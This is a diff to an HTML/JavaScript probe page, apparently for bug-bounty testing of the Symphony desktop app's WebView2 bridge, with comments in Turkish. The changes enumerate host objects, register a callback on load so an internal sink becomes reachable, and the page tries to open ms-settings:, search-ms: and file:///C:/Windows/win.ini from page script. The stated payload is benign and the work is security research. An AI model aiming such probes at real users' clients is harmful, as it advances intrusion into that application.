@@ -2,16 +2,17 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SDA Probe Page</title>
+<title>SDA Probe Page v3</title>
 <style>
   body{font-family:monospace;background:#111;color:#eee;padding:16px;max-width:900px}
   button{font-size:15px;padding:9px 12px;margin:5px 4px;cursor:pointer}
   pre{background:#000;padding:12px;border:1px solid #333;white-space:pre-wrap}
   .warn{color:#f90}
+  .ok{color:#6f6}
 </style>
 </head>
 <body>
-<h1>SDA Probe Page v2 (Simons/Carter — yalnızca test VM'inde koş)</h1>
+<h1>SDA Probe Page v3 (Simons/Carter — yalnızca test VM'inde koş)</h1>
 <p class="warn">Symphony SDA statik analiz probe'ları. Benign payload (badge=1337, toast metni). Sadece kendi test VM'inde ve <b>hackerone pod</b> gözlemi için.</p>
 
 <button id="btnInfo">1) Bilgi Dump (otomatik de çalışır)</button>
@@ -23,6 +24,7 @@
 <button id="btnF4b">7) F4: search-ms:query=probe (window.open)</button>
 <button id="btnF4c">8) F4: file:///C:/Windows/win.ini (window.open)</button>
 <button id="btnF4d">9) F4b: ms-settings:display (location.href navigasyon)</button>
+<button id="btnBBox">10) BBox Dump (callbacks durumu)</button>
 
 <pre id="out">hazır. Bilgi dump için 1'e bas.</pre>
 
@@ -40,13 +42,33 @@ function dumpInfo(){
   try {
     const ho = window.chrome && window.chrome.webview ? window.chrome.webview.hostObjects : null;
     log("hostObjects", ho ? (Object.keys(ho).join(",") || "empty") : "n/a");
+    if (ho) {
+      try { log("hostObjects.manaSSFBridge", typeof ho.manaSSFBridge); } catch(e){ log("ho.bridge.err", e.message); }
+    }
   } catch(e){ log("hostObjects.err", e.message); }
   log("crossOriginIsolated", window.crossOriginIsolated);
   log("hasOpener", !!window.opener);
 }
 
 document.getElementById('btnInfo').onclick = dumpInfo;
-window.addEventListener('load', dumpInfo);
+document.getElementById('btnBBox').onclick = function(){
+  try {
+    log("callbacks", Object.keys(window.manaSSF.callbacks).join(",") || "(bos)");
+    log("notificationCallbacks", Object.keys(window.manaSSF.notificationCallbacks).join(",") || "(bos)");
+    log("isClientReady", window.manaSSF.isClientReady);
+  } catch(e){ log("bbox.err", e.message); }
+};
+
+window.addEventListener('load', function(){
+  dumpInfo();
+  // F3 sink'inin wrapper if'i boundsChangeCallback kayitli olmasini sart kosuyor:
+  try {
+    window.manaSSF.callbacks['boundsChangeCallback'] = function(b){
+      log("boundsChangeCallback FIRED", JSON.stringify(b));
+    };
+    log("setup", "boundsChangeCallback registered (F3 wrapper icin) ✓");
+  } catch(e){ log("setup.err", e.message); }
+});
 
 document.getElementById('btnToast').onclick = function(){
   try {
@@ -86,11 +108,11 @@ document.getElementById('btnF3b').onclick = function(){
 };
 
 document.getElementById('btnF4a').onclick = function(){
-  try { const w = window.open("ms-settings:display"); log("F4a ms-settings (window.open)", w ? "pencere-ref alindi (bloklanmadi)" : "null — bloklanmis olabilir"); }
+  try { const w = window.open("ms-settings:display"); log("F4a ms-settings (window.open)", w ? "pencere-ref alindi (bloklanmadi)" : "null — WebView2 harici protokol akisi (izin diyalogu beklenir)"); }
   catch(e){ log("F4a.err", e.message); }
 };
 document.getElementById('btnF4b').onclick = function(){
-  try { const w = window.open("search-ms:query=probe"); log("F4b search-ms (window.open)", w ? "pencere-ref alindi (bloklanmadi)" : "null — bloklanmis olabilir"); }
+  try { const w = window.open("search-ms:query=probe"); log("F4b search-ms (window.open)", w ? "pencere-ref alindi (bloklanmadi)" : "null — WebView2 harici protokol akisi (izin diyalogu beklenir)"); }
   catch(e){ log("F4b.err", e.message); }
 };
 document.getElementById('btnF4c').onclick = function(){
@@ -98,7 +120,7 @@ document.getElementById('btnF4c').onclick = function(){
   catch(e){ log("F4c.err", e.message); }
 };
 document.getElementById('btnF4d').onclick = function(){
-  try { log("F4d", "location.href atanıyor: ms-settings:display (sayfa giderse Settings açıldı demektir)"); location.href = "ms-settings:display"; }
+  try { log("F4d", "location.href atanıyor: ms-settings:display (sayfa giderse navigasyon iptal edildi demektir)"); location.href = "ms-settings:display"; }
   catch(e){ log("F4d.err", e.message); }
 };
 </script>
